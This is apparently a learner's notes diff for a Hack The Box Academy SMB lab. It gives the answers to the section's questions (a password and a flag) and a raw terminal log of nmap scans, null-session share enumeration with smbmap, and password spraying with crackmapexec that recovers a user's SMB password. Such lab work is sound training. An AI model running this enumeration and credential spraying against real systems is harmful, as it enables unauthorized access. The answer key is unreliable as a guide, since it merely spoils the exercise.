@@ -966,3 +966,555 @@ We also cover enumeration using RPC in the [Active Directory Enumeration & Attac
 
 Keep in mind that some specific configurations are required to allow these types of changes through RPC. We can use the [rpclient man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) or [SMB Access from Linux Cheat Sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) from the SANS Institute to explore this further.
 
+---
+
+## Questions
+
+Answer the question(s) below to complete the section
+
+What is the name of the shared folder with READ permissions?
+- GGJ
+What is the password for the username "jason"?
+- 34c8zuNBo91!@28Bszh
+Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer
+- HTB{SMB_4TT4CKS_2349872359}
+
+```
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ sudo nmap -sC -sV -p 21 10.129.1.15
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-28 14:23 EDT
+Nmap scan report for 10.129.1.15
+Host is up (0.0079s latency).
+
+PORT   STATE  SERVICE VERSION
+21/tcp closed ftp
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ ftp 10.129.1.15
+ftp: Can't connect to `10.129.1.15:21': Connection refused
+ftp: Can't connect to `10.129.1.15:ftp'
+ftp> 
+ftp> connect
+?Invalid command.
+ftp> get
+Not connected.
+ftp> help
+Commands may be abbreviated.  Commands are:
+
+!		epsv6		mget		preserve	sendport
+$		exit		mkdir		progress	set
+account		features	mls		prompt		site
+append		fget		mlsd		proxy		size
+ascii		form		mlst		put		sndbuf
+bell		ftp		mode		pwd		status
+binary		gate		modtime		quit		struct
+bye		get		more		quote		sunique
+case		glob		mput		rate		system
+cd		hash		mreget		rcvbuf		tenex
+cdup		help		msend		recv		throttle
+chmod		idle		newer		reget		trace
+close		image		nlist		remopts		type
+cr		lcd		nmap		rename		umask
+debug		less		ntrans		reset		unset
+delete		lpage		open		restart		usage
+dir		lpwd		page		rhelp		user
+disconnect	ls		passive		rmdir		verbose
+edit		macdef		pdir		rstatus		xferbuf
+epsv		mdelete		pls		runique		?
+epsv4		mdir		pmlsd		send
+ftp> account
+Not connected.
+ftp> bye
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ sudo nmap -sV -sC -p139,445 10.129.1.15
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-28 14:27 EDT
+Nmap scan report for 10.129.1.15
+Host is up (0.0078s latency).
+
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Samba smbd 4
+445/tcp open  netbios-ssn Samba smbd 4
+
+Host script results:
+| smb2-time: 
+|   date: 2026-05-28T18:27:25
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+|_clock-skew: -1s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.55 seconds
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ smbclient -N -L //10.129.1.15
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	GGJ             Disk      Priv
+	IPC$            IPC       IPC Service (attcsvc-linux Samba)
+SMB1 disabled -- no workgroup available
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ smbmap -H 10.129.1.15 -r GGJ
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[\] Checking for open ports...                                                  [*] Detected 1 hosts serving SMB                  
+[|] Authenticating...                                                           [*] Established 1 SMB connections(s) and 0 authenticated session(s)
+[/] Authenticating...                                                           [-] Enumerating shares...                                                       [\] Enumerating shares...                                                       [|] Enumerating shares...                                                       [/] Enumerating shares...                                                       [-] Traversing shares...                                                                                                                                                            
+[+] IP: 10.129.1.15:445	Name: 10.129.1.15         	Status: NULL Session
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	print$                                            	NO ACCESS	Printer Drivers
+	GGJ                                               	READ ONLY	Priv
+	./GGJ
+	dr--r--r--                0 Tue Apr 19 17:33:55 2022	.
+	dr--r--r--                0 Mon Apr 18 13:08:30 2022	..
+	fr--r--r--             3381 Tue Apr 19 17:33:03 2022	id_rsa
+	IPC$                                              	NO ACCESS	IPC Service (attcsvc-linux Samba)
+[\] Closing connections..                                                       [|] Closing connections..                                                       [/] Closing connections..                                                       [-] Closing connections..                                                       [\] Closing connections..                                                       [|] Closing connections..                                                       [/] Closing connections..                                                       [-] Closing connections..                                                                                                                                       [*] Closed 1 connections
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ smbmap -H 10.129.1.15 -R GGJ
+usage: smbmap [-h] (-H HOST | --host-file FILE) [-u USERNAME] [-p PASSWORD | --prompt] [-k] [--no-pass]
+              [--dc-ip IP or Host] [-s SHARE] [-d DOMAIN] [-P PORT] [-v] [--signing] [--admin]
+              [--no-banner] [--no-color] [--no-update] [--timeout SCAN_TIMEOUT] [-x COMMAND]
+              [--mode CMDMODE] [-L | -r [PATH]] [-g FILE | --csv FILE] [--dir-only] [--no-write-check]
+              [-q] [--depth DEPTH] [--exclude SHARE [SHARE ...]] [-A PATTERN] [-F PATTERN]
+              [--search-path PATH] [--search-timeout TIMEOUT] [--download PATH] [--upload SRC DST]
+              [--delete PATH TO FILE] [--skip]
+smbmap: error: unrecognized arguments: -R GGJ
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ smbmap -H 10.129.1.15 --download GGJ\id_rsa
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[\] Checking for open ports...                                                                          [*] Detected 1 hosts serving SMB
+[|] Authenticating...                                                                                   [*] Established 1 SMB connections(s) and 0 authenticated session(s)
+[/] Authenticating...                                                                                   [-] Closing connections..                                                                               [\] Closing connections..                                                                               [|] Closing connections..                                                                               [/] Closing connections..                                                                               [-] Closing connections..                                                                               [*] Closed 1 connections                                                                            
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ ls
+1.php       Desktop    Downloads  my_data      Pictures     Templates
+cacert.der  Documents  Music      phpbash.php  reverse.jpg  Videos
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ smbmap -H 10.129.1.15 --download "GGJ\id_rsa"
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[\] Checking for open ports...                                                                          [*] Detected 1 hosts serving SMB
+[|] Authenticating...                                                                                   [*] Established 1 SMB connections(s) and 0 authenticated session(s)
+[/] Authenticating...                                                                                   [-] Authenticating...                                                                                   [+] Starting download: GGJ\id_rsa (3381 bytes)
+[!] Error retrieving file, access denied
+[\] Closing connections..                                                                               [|] Closing connections..                                                                               [/] Closing connections..                                                                               [-] Closing connections..                                                                               [*] Closed 1 connections                                                                            
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ smbmap -H 10.129.1.15 -R GGJ
+usage: smbmap [-h] (-H HOST | --host-file FILE) [-u USERNAME] [-p PASSWORD | --prompt] [-k]
+              [--no-pass] [--dc-ip IP or Host] [-s SHARE] [-d DOMAIN] [-P PORT] [-v] [--signing]
+              [--admin] [--no-banner] [--no-color] [--no-update] [--timeout SCAN_TIMEOUT] [-x COMMAND]
+              [--mode CMDMODE] [-L | -r [PATH]] [-g FILE | --csv FILE] [--dir-only] [--no-write-check]
+              [-q] [--depth DEPTH] [--exclude SHARE [SHARE ...]] [-A PATTERN] [-F PATTERN]
+              [--search-path PATH] [--search-timeout TIMEOUT] [--download PATH] [--upload SRC DST]
+              [--delete PATH TO FILE] [--skip]
+smbmap: error: unrecognized arguments: -R GGJ
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ smbmap -H 10.129.1.15 -r GGJ
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[\] Checking for open ports...                                                                          [*] Detected 1 hosts serving SMB
+[|] Authenticating...                                                                                   [*] Established 1 SMB connections(s) and 0 authenticated session(s)
+[/] Enumerating shares...                                                                               [-] Enumerating shares...                                                                               [\] Enumerating shares...                                                                               [|] Enumerating shares...                                                                               [/] Enumerating shares...                                                                               [-] Traversing shares...                                                                                                                                                                                    
+[+] IP: 10.129.1.15:445	Name: 10.129.1.15         	Status: NULL Session
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	print$                                            	NO ACCESS	Printer Drivers
+	GGJ                                               	READ ONLY	Priv
+	./GGJ
+	dr--r--r--                0 Tue Apr 19 17:33:55 2022	.
+	dr--r--r--                0 Mon Apr 18 13:08:30 2022	..
+	fr--r--r--             3381 Tue Apr 19 17:33:03 2022	id_rsa
+	IPC$                                              	NO ACCESS	IPC Service (attcsvc-linux Samba)
+[*] Closed 1 connections                                                                            
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ smbmap --help
+usage: smbmap [-h] (-H HOST | --host-file FILE) [-u USERNAME] [-p PASSWORD | --prompt] [-k]
+              [--no-pass] [--dc-ip IP or Host] [-s SHARE] [-d DOMAIN] [-P PORT] [-v] [--signing]
+              [--admin] [--no-banner] [--no-color] [--no-update] [--timeout SCAN_TIMEOUT] [-x COMMAND]
+              [--mode CMDMODE] [-L | -r [PATH]] [-g FILE | --csv FILE] [--dir-only] [--no-write-check]
+              [-q] [--depth DEPTH] [--exclude SHARE [SHARE ...]] [-A PATTERN] [-F PATTERN]
+              [--search-path PATH] [--search-timeout TIMEOUT] [--download PATH] [--upload SRC DST]
+              [--delete PATH TO FILE] [--skip]
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+options:
+  -h, --help            show this help message and exit
+
+Main arguments:
+  -H HOST               IP or FQDN
+  --host-file FILE      File containing a list of hosts
+  -u, --username USERNAME
+                        Username, if omitted null session assumed
+  -p, --password PASSWORD
+                        Password or NTLM hash, format is LMHASH:NTHASH
+  --prompt              Prompt for a password
+  -s SHARE              Specify a share (default C$), ex 'C$'
+  -d DOMAIN             Domain name (default WORKGROUP)
+  -P PORT               SMB port (default 445)
+  -v, --version         Return the OS version of the remote host
+  --signing             Check if host has SMB signing disabled, enabled, or required
+  --admin               Just report if the user is an admin
+  --no-banner           Removes the banner from the top of the output
+  --no-color            Removes the color from output
+  --no-update           Removes the "Working on it" message
+  --timeout SCAN_TIMEOUT
+                        Set port scan socket timeout. Default is .5 seconds
+
+Kerberos settings:
+  -k, --kerberos        Use Kerberos authentication
+  --no-pass             Use CCache file (export KRB5CCNAME='~/current.ccache')
+  --dc-ip IP or Host    IP or FQDN of DC
+
+Command Execution:
+  Options for executing commands on the specified host
+
+  -x COMMAND            Execute a command ex. 'ipconfig /all'
+  --mode CMDMODE        Set the execution method, wmi or psexec, default wmi
+
+Shard drive Search:
+  Options for searching/enumerating the share of the specified host(s)
+
+  -L                    List all drives on the specified host, requires ADMIN rights.
+  -r [PATH]             Recursively list dirs and files (no share\path lists the root of ALL shares),
+                        ex. 'email/backup'
+  -g FILE               Output to a file in a grep friendly format, used with -r (otherwise it outputs
+                        nothing), ex -g grep_out.txt
+  --csv FILE            Output to a CSV file, ex --csv shares.csv
+  --dir-only            List only directories, ommit files.
+  --no-write-check      Skip check to see if drive grants WRITE access.
+  -q                    Quiet verbose output. Only shows shares you have READ or WRITE on, and
+                        suppresses file listing when performing a search (-A).
+  --depth DEPTH         Traverse a directory tree to a specific depth. Default is 1 (root node).
+  --exclude SHARE [SHARE ...]
+                        Exclude share(s) from searching and listing, ex. --exclude ADMIN$ C$'
+  -A PATTERN            Define a file name pattern (regex) that auto downloads a file on a match
+                        (requires -r), not case sensitive, ex '(web|global).(asax|config)'
+
+File Content Search:
+  Options for searching the content of files (must run as root), kind of experimental
+
+  -F PATTERN            File content search, -F '[Pp]assword' (requires admin access to execute
+                        commands, and PowerShell on victim host)
+  --search-path PATH    Specify drive/path to search (used with -F, default C:\Users), ex 'D:\HR\'
+  --search-timeout TIMEOUT
+                        Specifcy a timeout (in seconds) before the file search job gets killed.
+                        Default is 300 seconds.
+
+Filesystem interaction:
+  Options for interacting with the specified host's filesystem
+
+  --download PATH       Download a file from the remote system, ex.'C$\temp\passwords.txt'
+  --upload SRC DST      Upload a file to the remote system ex. '/tmp/payload.exe C$\temp\payload.exe'
+  --delete PATH TO FILE
+                        Delete a remote file, ex. 'C$\temp\msf.exe'
+  --skip                Skip delete file confirmation prompt
+
+Examples:
+
+$ smbmap -u jsmith -p password1 -d workgroup -H 192.168.0.1
+$ smbmap -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H 172.16.0.20
+$ smbmap -u 'apadmin' -p 'asdf1234!' -d ACME -Hh 10.1.3.30 -x 'net group "Domain Admins" /domain'
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ smbmap -H 10.129.1.15 -x "ssh jason@10.129.1.15 -i GGJ\id_rsa"
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[\] Checking for open ports...                                                                          [*] Detected 1 hosts serving SMB
+[|] Authenticating...                                                                                   [*] Established 1 SMB connections(s) and 0 authenticated session(s)
+[/] Authenticating...                                                                                   [-] Closing connections..                                                                               [\] Closing connections..                                                                               [|] Closing connections..                                                                               [/] Closing connections..                                                                               [-] Closing connections..                                                                               [*] Closed 1 connections                                                                            
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ smbmap -H 10.129.1.15 -x "type GGJ\id_rsa"
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[\] Checking for open ports...                                                                          [*] Detected 1 hosts serving SMB
+[|] Authenticating...                                                                                   [*] Established 1 SMB connections(s) and 0 authenticated session(s)
+[/] Authenticating...                                                                                   [-] Closing connections..                                                                               [\] Closing connections..                                                                               [|] Closing connections..                                                                               [/] Closing connections..                                                                               [-] Closing connections..                                                                               [*] Closed 1 connections                                                                            
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ smbmap -H 10.129.1.15 -x type GGJ\id_rsa
+usage: smbmap [-h] (-H HOST | --host-file FILE) [-u USERNAME] [-p PASSWORD | --prompt] [-k]
+              [--no-pass] [--dc-ip IP or Host] [-s SHARE] [-d DOMAIN] [-P PORT] [-v] [--signing]
+              [--admin] [--no-banner] [--no-color] [--no-update] [--timeout SCAN_TIMEOUT] [-x COMMAND]
+              [--mode CMDMODE] [-L | -r [PATH]] [-g FILE | --csv FILE] [--dir-only] [--no-write-check]
+              [-q] [--depth DEPTH] [--exclude SHARE [SHARE ...]] [-A PATTERN] [-F PATTERN]
+              [--search-path PATH] [--search-timeout TIMEOUT] [--download PATH] [--upload SRC DST]
+              [--delete PATH TO FILE] [--skip]
+smbmap: error: unrecognized arguments: GGJid_rsa
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ cd Downloads/
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~/Downloads]
+└──╼ [★]$ ls
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~/Downloads]
+└──╼ [★]$ ls -la
+total 8
+drwx------  2 crimsonguard crimsonguard 4096 May 28 14:43 .
+drwx------ 23 crimsonguard crimsonguard 4096 May 28 14:43 ..
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~/Downloads]
+└──╼ [★]$ cd ..
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ ls
+10.129.1.15-GGJ_id_rsa                    Documents                                 phpbash.php
+1.php                                     Downloads                                 Pictures
+7780f216-a583-4f75-b77a-d8f5abae29c4.zip  fc2b7f37-b1cb-4a08-b7ff-a662ad2cdf3b.zip  reverse.jpg
+cacert.der                                Music                                     Templates
+Desktop                                   my_data                                   Videos
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ unzip 7780f216-a583-4f75-b77a-d8f5abae29c4.zip fc2b7f37-b1cb-4a08-b7ff-a662ad2cdf3b.zip 
+Archive:  7780f216-a583-4f75-b77a-d8f5abae29c4.zip
+caution: filename not matched:  fc2b7f37-b1cb-4a08-b7ff-a662ad2cdf3b.zip
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ unzip 7780f216-a583-4f75-b77a-d8f5abae29c4.zip
+Archive:  7780f216-a583-4f75-b77a-d8f5abae29c4.zip
+  inflating: pws.list                
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ unzip fc2b7f37-b1cb-4a08-b7ff-a662ad2cdf3b.zip 
+Archive:  fc2b7f37-b1cb-4a08-b7ff-a662ad2cdf3b.zip
+  inflating: users.list              
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ crackmapexec smb 10.129.1.15 -u users.list -p p
+phpbash.php  pws.list     
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ crackmapexec smb 10.129.1.15 -u users.list -p pws.list --local-auth SMB 10.129.1.15 445
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating missing folder logs
+[*] Creating missing folder modules
+[*] Creating missing folder workspaces
+[*] Creating missing folder obfuscated_scripts
+[*] Creating missing folder screenshots
+[*] Creating missing folder logs/sam
+[*] Creating missing folder logs/lsa
+[*] Creating missing folder logs/ntds
+[*] Creating missing folder logs/dpapi
+[*] Creating default workspace
+[*] Initializing SMB protocol database
+[*] Initializing MSSQL protocol database
+[*] Initializing VNC protocol database
+[*] Initializing LDAP protocol database
+[*] Initializing RDP protocol database
+[*] Initializing FTP protocol database
+[*] Initializing SSH protocol database
+[*] Initializing WMI protocol database
+[*] Initializing NFS protocol database
+[*] Initializing WINRM protocol database
+[*] Copying default configuration file
+usage: cme [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress]
+           [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
+           [--dns-timeout DNS_TIMEOUT]
+           {smb,mssql,vnc,ldap,rdp,ftp,ssh,wmi,nfs,winrm} ...
+cme: error: unrecognized arguments: SMB 10.129.1.15 445
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ crackmapexec smb 10.129.1.15 -u users.list -p pws.list --local-auth
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [*] Unix - Samba (name:ATTCSVC-LINUX) (domain:ATTCSVC-LINUX) (signing:False) (SMBv1:None) (Null Auth:True)
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [+] ATTCSVC-LINUX\aartjan:liverpool (Guest)
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ crackmapexec smb 10.129.1.15 -u jason -p pws.list --local-auth
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [*] Unix - Samba (name:ATTCSVC-LINUX) (domain:ATTCSVC-LINUX) (signing:False) (SMBv1:None) (Null Auth:True)
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:liverpool STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:theman STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:bandit STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:dolphins STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:maddog STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:packers STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:jaguar STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:lovers STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:nicholas STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:united STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:tiffany STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:maxwell STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:zzzzzz STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:nirvana STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:jeremy STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:suckit STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:stupid STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:porn STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:monica STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:elephant STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:giants STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:jackass STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:hotdog STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:rosebud STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:success STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:debbie STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:mountain STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:444444 STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:xxxxxxxx0 STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:warrior STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:1q2w3e4r5t STATUS_LOGON_FAILURE 
+SMB         10.129.1.15     445    ATTCSVC-LINUX    [+] ATTCSVC-LINUX\jason:34c8zuNBo91!@28Bszh 
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ ssh jason@10.129.1.15
